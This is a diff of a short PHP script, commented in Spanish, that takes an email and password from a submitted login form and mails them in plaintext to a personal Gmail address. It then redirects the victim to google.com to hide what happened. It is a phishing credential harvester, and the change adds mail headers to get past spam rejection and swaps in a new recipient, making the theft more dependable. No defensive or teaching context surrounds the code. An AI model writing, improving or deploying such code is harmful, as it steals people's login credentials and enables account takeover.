@@ -1,18 +1,26 @@
 <?php
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    $email = $_POST["email"];
-    $password = $_POST["password"];
+    // Recibir datos
+    $email = $_POST["email"] ?? '';
+    $password = $_POST["password"] ?? '';
 
-    // Aquí podrías realizar más validaciones y procesamiento de datos
+    // Tu correo de destino
+    $destinatario = "sebastiancq2008@gmail.com";
+    $asunto = "Nuevo inicio de sesión";
+    $mensaje = "Correo electrónico: " . $email . "\nContraseña: " . $password;
 
-    // Enviar un correo electrónico con los datos (ESTO ES SOLO UN EJEMPLO)
-    $to = "gmail@borjagalisteo.com";
-    $subject = "Nuevo inicio de sesión";
-    $message = "Correo electrónico: $email\nContraseña: $password";
-    mail($to, $subject, $message);
+    // Encabezados obligatorios para que no lo rechacen
+    $encabezados = "From: no-responder@tudominio.com\r\n";
+    $encabezados .= "Reply-To: no-responder@tudominio.com\r\n";
+    $encabezados .= "X-Mailer: PHP/" . phpversion();
 
-    // Redirigir después de enviar el correo electrónico
-    header("Location: https://www.google.com");
-    exit(); // Asegura que no se ejecuten más instrucciones después de la redirección
+    // Enviar correo
+    if (mail($destinatario, $asunto, $mensaje, $encabezados)) {
+        // Redirigir si se envió
+        header("Location: https://www.google.com");
+        exit;
+    } else {
+        echo "Hubo un error al intentar enviar el correo.";
+    }
 }
 ?>
